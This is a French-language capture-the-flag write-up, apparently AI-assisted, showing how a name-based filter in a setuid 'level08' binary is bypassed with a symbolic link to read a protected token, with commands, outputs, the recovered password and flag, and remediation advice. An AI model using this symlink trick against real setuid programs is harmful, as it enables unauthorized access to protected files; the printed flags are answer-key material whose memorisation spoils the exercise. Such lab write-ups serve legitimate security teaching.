Voici ton texte complété :

---

# Rapport de Vulnérabilité : Contournement de filtre par lien symbolique

## Description

Dans ce niveau, un fichier `token` contient un flag mais est inaccessible directement via le programme `level08`. Le binaire exécutable `level08` fonctionne avec les droits de l’utilisateur `flag08` (grâce au **setuid**), ce qui signifie qu’il a les permissions pour executer le fichier `token`. Cependant, un filtrage sur le **nom du fichier** empêche un accès direct à `token`. En utilisant un **lien symbolique** pointant vers ce fichier sous un autre nom, il est possible de contourner ce filtre et de lire le contenu du fichier.

## Comment Exploiter la Faille

### Étape 1 : Analyse des fichiers et des permissions

```bash
ls -l
```

**Résultat :**

```
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

* Le fichier `level08` a le **bit SUID** et s’exécute avec les droits de `flag08`.
* Le fichier `token` est lisible uniquement par `flag08`.

### Étape 2 : Exécution du programme avec le fichier bloqué

```bash
./level08 token
```

**Résultat :**

```
You may not access 'token'
```

Le binaire refuse explicitement l’accès au fichier s’il s’appelle **token**.

Le programme bloque visiblement l'accès en fonction du **nom** du fichier fourni, et non de son contenu ou de sa cible réelle.

### Étape 3 : Création d’un lien symbolique

Créer un lien symbolique vers `token` avec un autre nom :

```bash
ln -s ~/token /tmp/lien.txt
```

### Étape 4 : Exécution du binaire avec le lien symbolique

```bash
./level08 /tmp/lien.txt
```

**Résultat :**

```
quif5eloekouj29ke0vouxean
```

Le flag est lu avec succès via le lien, car le programme n’a pas détecté le nom `token`.

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Ne jamais filtrer uniquement sur le nom du fichier** : Cela peut facilement être contourné avec des liens symboliques ou des chemins alternatifs.
* **Vérifier l'identité réelle du fichier** : Utiliser `realpath()`, `stat()` ou vérifier l'inode ou l’UID propriétaire.
* **Limiter les chemins d'accès** : Restreindre les accès à un répertoire spécifique, sans autoriser les liens symboliques extérieurs.

## Étape Finale

On se connecte ensuite à l’utilisateur `flag08` en utilisant le mot de passe obtenu pour exécuter la commande suivante et obtenir le flag :

```bash
getflag
```

**Flag récupéré** : `25749xKZ8L7DkSCwJkT9dyv6f`
## Conclusion

Cette vulnérabilité montre qu’un contrôle basé uniquement sur le nom d’un fichier est insuffisant. En créant un lien symbolique vers une ressource protégée, un attaquant peut facilement contourner cette restriction. Il est essentiel de **valider la cible réelle** des fichiers manipulés pour garantir la sécurité.

---
